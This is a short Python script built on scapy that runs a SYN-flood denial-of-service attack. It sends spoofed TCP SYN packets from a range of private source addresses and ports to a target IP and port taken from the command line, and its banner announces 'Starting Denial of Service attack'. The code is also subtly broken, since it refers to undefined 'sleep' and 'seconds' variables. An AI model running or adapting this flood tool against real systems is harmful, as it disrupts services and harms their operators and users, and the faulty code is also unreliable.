#!/usr/bin/env python

from docopt import docopt
import logging
import sys
from scapy.all import *

def main():
	src_net = "192.168.250."
	dst_ip = sys.argv[1]
	dst_port = int(sys.argv[2])
	
	print("\n###########################################")
	print("# Starting Denial of Service attack...")
	print("###########################################\n")
	for src_host in range(1,254):
		for src_port in range(1024, 65535):
			# Build the packet
			src_ip = src_net + str(src_host)
			network_layer = IP(src=src_ip,dst=dst_ip)
			transport_layer = TCP(sport=src_port, dport=dst_port,flags="S")
			
			# Send the packet
			send(network_layer/transport_layer,verbose=False)
			
			if sleep:
				time.sleep(seconds)

	print("[+] Denial of Service attack finished.")

main()
